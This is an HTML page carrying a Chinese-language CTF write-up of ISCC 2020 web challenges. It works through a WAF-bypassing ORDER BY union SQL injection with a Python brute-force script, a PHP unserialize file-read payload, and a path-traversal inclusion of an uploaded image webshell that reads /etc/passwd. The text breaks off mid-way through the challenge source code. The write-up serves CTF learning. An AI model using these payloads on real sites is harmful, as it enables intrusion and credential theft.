<!DOCTYPE HTML>
<html lang="en">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="ISCC 2020 Web WriteUp, Qftm">
    <meta name="description" content="Maybe a hacker">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>ISCC 2020 Web WriteUp | Qftm</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Qftm</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>Index</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>Tags</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>Categories</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>Archives</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-heartbeat" style="zoom: 0.6;"></i>
      
      <span>About</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>Friends</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Qftm</div>
        <div class="logo-desc">
            
            Maybe a hacker
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			Index
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			Tags
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			Categories
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			Archives
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-heartbeat"></i>
			
			About
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			Friends
		</a>
          
        </li>
        
        
    </ul>
</div>


        </div>

        
    </nav>

</header>

    
<script src="/libs/cryptojs/crypto-js.min.js"></script>
<script>
    (function() {
        let pwd = '';
        if (pwd && pwd.length > 0) {
            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                alert('密码错误，将返回主页！');
                location.href = '/';
            }
        }
    })();
</script>




<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/banner/bg.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">ISCC 2020 Web WriteUp</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        margin: 35px 0 15px 0;
        padding-left: 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        height: calc(100vh - 250px);
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/CTF/">
                                <span class="chip bg-color">CTF</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/CTF/" class="post-category">
                                CTF
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
                    2020-05-26
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
                    2020-12-22
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
                    12.6k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
                    58 Min
                </div>
                

                
            </div>
        </div>
        <hr class="clearfix">
        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录一下ISCC2020历经25天的Web题解，题量可能有点多 QAQ ！！针对题目的难易程度上：易、中、难都有（老少皆宜），此次比赛和以往不太一样，增加了擂台题和实战题一定程度上还是不错的。</p>
<h1 id="练武题-Web"><a href="#练武题-Web" class="headerlink" title="练武题-Web"></a>练武题-Web</h1><h2 id="阿森的爱情-1"><a href="#阿森的爱情-1" class="headerlink" title="阿森的爱情-1"></a>阿森的爱情-1</h2><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501183916930.png" alt="image-20200501183916930"></p>
<p>考点：敏感信息收集</p>
<p>使用工具对网站进行敏感信息的探测，存在<code>readme.txt</code></p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501091103663.png" alt="image-20200501091103663"></p>
<p>访问<code>readme.txt</code>直接得到flag</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501091123914.png" alt="image-20200501091123914"></p>
<pre><code>flag{uragoodman}</code></pre><h2 id="阿森的爱情-2"><a href="#阿森的爱情-2" class="headerlink" title="阿森的爱情-2"></a>阿森的爱情-2</h2><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200507234350380.png" alt="image-20200507234350380"></p>
<p>考点：SQL注入</p>
<p>题目打开是一个登录界面，测试是否存在注入，发现有waf拦截</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200521231834575.png" alt="image-20200521231834575"></p>
<p>碰到这样直接fuzz探测存在哪些字符被拦截，只有知道哪些字符被拦截了才能够进行下一步的注入绕过，这里使用bp进行fuzz</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200521232516834.png" alt="image-20200521232516834"></p>
<p>紧接着测试发现存在布尔盲注</p>
<pre><code>username=admin&#39; and 2&gt;1#&amp;password=11&amp;submit=enter</code></pre><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200521233433524.png" alt="image-20200521233433524"></p>
<p>虽然存在布尔盲注，但是由于网站waf对一些特殊字符的拦截导致布尔盲注无法利用，同时在测试时间盲注和报错盲注的时候也是因为waf的拦截导致无法利用。</p>
<p>既然因为waf的拦截导致无法利用，那就分析waf拦截的字符，发现对<code>select、order by、union</code>等字符没有被过滤，所以这里可以尝试使用针对<code>order by</code>的联合查询注入读取敏感信息。</p>
<p>探测当前数据库表存在的列数（根据回显信息得出当前表为3列，可以猜测三列分别为：id、username、password）</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200522000753822.png" alt="image-20200522000753822"></p>
<p>知道列数之后开始进行联合查询，测试发现存在联合查询注入，同时页面回显的内容正是第二列用户名的内容</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200522001500990.png" alt="image-20200522001500990"></p>
<p>根据之前的提示，flag存在于第三列密码字段列中：<code>The content in the password column is the flag!</code>，但是因为页面回显的是第二列内容无法回显第三列内容，所以这里无法直接利用上述payload，到这里是否真的无法判断第三列内容呢，答案是否定的，这里可以巧妙的使用<code>order by</code>以及结合页面的回显来判断第三列所存储的密码，下面编写测试数据表进行测试分析</p>
<p>测试数据:</p>
<pre><code>+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | bfe42ac26e273ef3a859a651e0a02df0 |
+----+----------+----------------------------------+</code></pre><p>注入分析:</p>
<p>由于网站联合注入显示的是第二列内容，那么我们就可以通过使用<code>order by</code>操作第三列同时改变联合查询第三列的值，来判断网站数据库表中第三列的的存储的真实密码</p>
<p>payload</p>
<pre><code>select * from test.test0 union select 1,2,&#39;c&#39; order by 3,2;</code></pre><p><code>order by 3,2</code>表示先以第三列排序，如果遇到第三列内容完全相同则再使用第二列进行相同行的排序</p>
<p>由于使用第三列进行排序，所以当联合查询中第三列的字符如果小于等于真实的第三列密码字符则会页面会显示字符<code>2</code>，否则显示<code>admin</code>，下面通过测试用例来查看</p>
<pre><code>mysql&gt; select * from test.test0 union select 1,2,&#39;a&#39; order by 3,2; 
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | 2        | a                                |
|  1 | admin    | bfe42ac26e273ef3a859a651e0a02df0 |
+----+----------+----------------------------------+
2 rows in set (0.00 sec)

mysql&gt; select * from test.test0 union select 1,2,&#39;b&#39; order by 3,2; 
+----+----------+----------------------------------+ 
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | 2        | b                                |
|  1 | admin    | bfe42ac26e273ef3a859a651e0a02df0 |
+----+----------+----------------------------------+
2 rows in set (0.00 sec)

mysql&gt; select * from test.test0 union select 1,2,&#39;c&#39; order by 3,2; 
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | bfe42ac26e273ef3a859a651e0a02df0 |
|  1 | 2        | c                                | 
+----+----------+----------------------------------+ 
2 rows in set (0.00 sec)</code></pre><p>从结果可以验证，通过对第三列进行排序确实可以判断第三列所存储的密码，其真实密码等于页面显示<code>admin</code>判定出来的每一个字符减一，下面对中间字符判断测试</p>
<pre><code>mysql&gt; select * from test.test0 union select 1,2,&#39;bfe42ac26e26&#39; order by 3,2;
+----+----------+----------------------------------+                         
| id | username | password                         |                         
+----+----------+----------------------------------+                         
|  1 | 2        | bfe42ac26e26                     |                         
|  1 | admin    | bfe42ac26e273ef3a859a651e0a02df0 |                         
+----+----------+----------------------------------+                         
2 rows in set (0.00 sec)                                                     

mysql&gt; select * from test.test0 union select 1,2,&#39;bfe42ac26e27&#39; order by 3,2;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | 2        | bfe42ac26e27                     |
|  1 | admin    | bfe42ac26e273ef3a859a651e0a02df0 |
+----+----------+----------------------------------+
2 rows in set (0.00 sec)

mysql&gt; select * from test.test0 union select 1,2,&#39;bfe42ac26e28&#39; order by 3,2;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | bfe42ac26e273ef3a859a651e0a02df0 |
|  1 | 2        | bfe42ac26e28                     |
+----+----------+----------------------------------+
2 rows in set (0.00 sec)</code></pre><p>最后对末尾字符进行判断</p>
<pre><code>mysql&gt; select * from test.test0 union select 1,2,&#39;bfe42ac26e273ef3a859a651e0a02df0&#39; order by 3,2;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | 2        | bfe42ac26e273ef3a859a651e0a02df0 |
|  1 | admin    | bfe42ac26e273ef3a859a651e0a02df0 |
+----+----------+----------------------------------+
2 rows in set (0.00 sec)

mysql&gt; select * from test.test0 union select 1,2,&#39;bfe42ac26e273ef3a859a651e0a02df1&#39; order by 3,2;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | bfe42ac26e273ef3a859a651e0a02df0 |
|  1 | 2        | bfe42ac26e273ef3a859a651e0a02df1 |
+----+----------+----------------------------------+
2 rows in set (0.00 sec)</code></pre><p>在判断末尾最后一个字符的时候<code>order by 3,2</code>中第二列判断就该起作用了</p>
<p>通过上述本地模拟数据的测试，现在编写脚本来对该网站进行注入读取敏感数据</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests
url<span class="token operator">=</span><span class="token string">'http://101.201.126.95:7006'</span>
string<span class="token operator">=</span><span class="token string">'0123456789abcdefghijkmnlopqrstuvwxyz'</span> <span class="token comment" spellcheck="true">#密码字段，大小写字母无所谓</span>
flag<span class="token operator">=</span><span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> a <span class="token keyword">in</span> string<span class="token punctuation">:</span>
        payload<span class="token operator">=</span><span class="token string">"admin' union select 1,'2','"</span><span class="token operator">+</span>flag<span class="token operator">+</span>str<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"' order by 3,2#"</span>
        data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"submit"</span><span class="token punctuation">:</span><span class="token string">"enter"</span><span class="token punctuation">}</span>
        result<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text
        <span class="token keyword">if</span> <span class="token string">'admin'</span> <span class="token keyword">in</span> result<span class="token punctuation">:</span>
            flag<span class="token operator">+=</span>string<span class="token punctuation">[</span>string<span class="token punctuation">.</span>index<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>注入结果</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200522005414385.png" alt="image-20200522005414385"></p>
<p>解密密码得到flag</p>
<pre><code>ciphertext：bfe42ac26e273ef3a859a651e0a02df0

plaintext：iloveishuai

flag{iloveishuai}</code></pre><h2 id="Php-is-the-best-language"><a href="#Php-is-the-best-language" class="headerlink" title="Php is the best language"></a>Php is the best language</h2><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501183937733.png" alt="image-20200501183937733"></p>
<p>考点：反序列化<code>__toString</code>的利用</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200508135602483.png" alt="image-20200508135602483"></p>
<p>根据提示下载文件</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  
@<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name">baby</span> 
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">"./{$this->file}"</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$good</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$good</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> 
<span class="token punctuation">{</span>
    <span class="token variable">$url</span><span class="token operator">=</span><span class="token string">'./index.php'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$html</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$html</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token string">"&lt;p>谢谢参与!&lt;/p>"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>对下载下来的源码进行代码审计，发现存在反序列化参数可控，并且可以正常触发反序列数据，根据序列化代码部分，构造恶意的序列化payload</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">baby</span> 
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">"./{$this->file}"</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">baby</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$flag</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200508135226640.png" alt="image-20200508135226640"></p>
<p>继续审计，使用攻击载荷，对Get请求data传参，传入序列化数据，当反序列化数据被当作字符串处理时<code>echo</code>，会触发<code>__toString</code>反序列化载荷，然后由<code>file_get_contents($filename)</code>执行读取文件的操作</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501091430687.png" alt="image-20200501091430687"></p>
<p>base64解码得到特殊文件内容</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501091648498.png" alt="image-20200501091648498"></p>
<pre><code>flag{u_r_really_a_php_expert}</code></pre><h2 id="What-can-images-do"><a href="#What-can-images-do" class="headerlink" title="What can images do"></a>What can images do</h2><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501183958488.png" alt="image-20200501183958488"></p>
<p>考点：文件包含Bypass前缀限制、敏感信息泄露</p>
<p>题目面目</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501142840150.png" alt="image-20200501142840150"></p>
<p>测试上传文件，发现只能上传<code>jpg,jpeg,png</code>格式</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501142958083.png" alt="image-20200501142958083"></p>
<p>继续往下看，测试下一个功能发现存在文件包含</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501143915664.png" alt="image-20200501143915664"></p>
<pre><code>?filename=../../../../etc/passwd</code></pre><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501143142056.png" alt="image-20200501143142056"></p>
<p>然而并不能使用PHP伪协议，存在包含限制，于是对网站扫描敏感信息得到网站关键路径</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501143405106.png" alt="image-20200501143405106"></p>
<p><code>/inc/</code>目录存放网站上传功能的脚本</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501143553659.png" alt="image-20200501143553659"></p>
<p><code>include</code>目录存放网站包含所需的文件</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501143632617.png" alt="image-20200501143632617"></p>
<p><code>uploads</code>目录存放网站上传的文件</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501143724204.png" alt="image-20200501143724204"></p>
<p>根据<code>include</code>目录文件信息可以猜测包含功能函数限制在<code>include</code>目录里面，类似代码如下：</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token keyword">include</span><span class="token operator">/</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这时候再看网站本身文件的包含，确实是直接限制在include目录里面</p>
<p><code>?filename=file5.php&amp;submit=提交查询</code></p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501143915664.png" alt="image-20200501143915664"></p>
<p>这个时候已经很清楚了，由于没有对<code>../</code>进行过滤，直接上传图片马，路径穿透包含图片马Getshell</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501144801560.png" alt="image-20200501144801560"></p>
<pre><code>http://101.201.126.95:7004/?filename=../uploads/2020/05/01/2418455eabbf3f5765a454339781.jpg&amp;submit=%25E6%258F%2590%25E4%25BA%25A4%25E6%259F%25A5%25E8%25AF%25A2</code></pre><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501144523185.png" alt="image-20200501144523185"></p>
<pre><code>cat flag.php

flag{ISCC_FREAKING_AWESOME}</code></pre><p><strong>附题目源码</strong></p>
<ul>
<li>index.php</li>
</ul>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$SELF_PAGE</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$SELF_PAGE</span> <span class="token operator">=</span> <span class="token string">"clientcheck.php"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$ACTIVE</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token 